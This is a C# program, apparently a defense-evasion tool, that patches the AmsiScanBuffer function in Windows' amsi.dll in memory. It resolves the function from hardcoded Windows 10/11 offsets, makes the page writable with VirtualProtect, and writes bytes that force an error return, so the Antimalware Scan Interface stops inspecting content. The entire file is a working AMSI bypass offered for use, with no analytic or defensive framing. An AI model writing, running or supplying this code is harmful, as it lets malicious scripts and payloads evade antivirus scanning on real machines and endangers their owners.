using System;
using System.Runtime.InteropServices;

namespace AmsiScanBuffer
{
    internal class Program
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        private const uint PAGE_EXECUTE_READWRITE = 0x40;

#if x64
        private static IntPtr AmsiScanBuffer_Win11 = (IntPtr)0x180008260;
        private static IntPtr AmsiScanBuffer_Win10 = (IntPtr)0x180003860;
        private static IntPtr RebaseAddress = (IntPtr)0x180000000;
#else
        private static IntPtr AmsiScanBuffer_Win11 = (IntPtr)0x10005D60;
        private static IntPtr AmsiScanBuffer_Win10 = (IntPtr)0x10005960;
        private static IntPtr RebaseAddress = (IntPtr)0x10000000;
#endif

        private static IntPtr ResolveAddress(IntPtr relativeAddress, IntPtr relativeBase, string moduleName)
        {
            IntPtr moduleHandle = GetModuleHandle(moduleName);
            if (moduleHandle == IntPtr.Zero)
            {
                Console.WriteLine($"[*] {moduleName} not loaded. Loading manually...");
                moduleHandle = LoadLibrary(moduleName);
            }

            if (moduleHandle == IntPtr.Zero)
            {
                Console.WriteLine($"[-] Failed to load {moduleName}.");
                return IntPtr.Zero;
            }

            return (IntPtr)((long)relativeAddress - (long)relativeBase + (long)moduleHandle);
        }

        static void Main(string[] args)
        {
            Console.WriteLine("[+] Starting AMSI Patch...");
            Console.WriteLine("[+] Not a 100% Work rate!");

            try
            {
                string moduleName = "amsi.dll";
                IntPtr patchAddress = IntPtr.Zero;

                Version osVersion = Environment.OSVersion.Version;
                bool isWin11 = (osVersion.Major >= 10 && osVersion.Build >= 22000);

                if (isWin11)
                {
                    Console.WriteLine("[*] Detected Windows 11.");
                    patchAddress = ResolveAddress(AmsiScanBuffer_Win11, RebaseAddress, moduleName);
                }
                else
                {
                    Console.WriteLine("[*] Detected Windows 10 or earlier.");
                    patchAddress = ResolveAddress(AmsiScanBuffer_Win10, RebaseAddress, moduleName);
                }

                if (patchAddress == IntPtr.Zero)
                {
                    Console.WriteLine("[-] Patch address is NULL. Aborting.");
                    return;
                }

                Console.WriteLine($"[*] Patch address resolved: 0x{patchAddress.ToInt64():X}");

                byte[] patchBytes = (IntPtr.Size == 8)
                    ? new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0x48, 0x8B, 0x04, 0x24, 0x48, 0x83, 0xC4, 0x08, 0xFF, 0xE0 }
                    : new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0x58, 0x83, 0xC4, 0x18, 0xFF, 0xE0 };

                uint oldProtect;
                if (VirtualProtect(patchAddress, (UIntPtr)patchBytes.Length, PAGE_EXECUTE_READWRITE, out oldProtect))
                {
                    Marshal.Copy(patchBytes, 0, patchAddress, patchBytes.Length);
                    VirtualProtect(patchAddress, (UIntPtr)patchBytes.Length, oldProtect, out oldProtect);

                    Console.WriteLine("[+] AMSI Patch Applied Successfully!");
                }
                else
                {
                    Console.WriteLine("[-] Failed to change memory protection.");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Error: {ex.Message}");
            }
        }
    }
}
